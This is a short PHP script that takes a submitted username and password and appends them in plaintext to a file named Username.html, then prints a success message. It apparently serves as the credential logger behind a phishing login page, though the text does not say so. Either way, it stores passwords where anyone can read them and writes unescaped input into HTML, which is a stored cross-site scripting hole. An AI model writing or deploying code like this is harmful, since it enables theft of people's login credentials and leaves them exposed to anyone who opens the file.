<?php
if(isset($_POST['submit'])){
   $username  = "Username    :".$_POST ["username"];
	$password = "Password    :".$_POST ["password"];
		  
		    //Seve File To Username 
	    //Coding bu Md Golam Rasul
	$File =  fopen ('Username.html','a');
	fwrite ($File, "<br />");
	fwrite ($File, "$username");
	fwrite ($File, "<br />");
	fwrite ($File, "$password");
	fclose ($File);
	//Coding bu Md Golam Rasul
		$Suss  = "Successful Save Your File";
	echo $Suss;
	}
 ?>
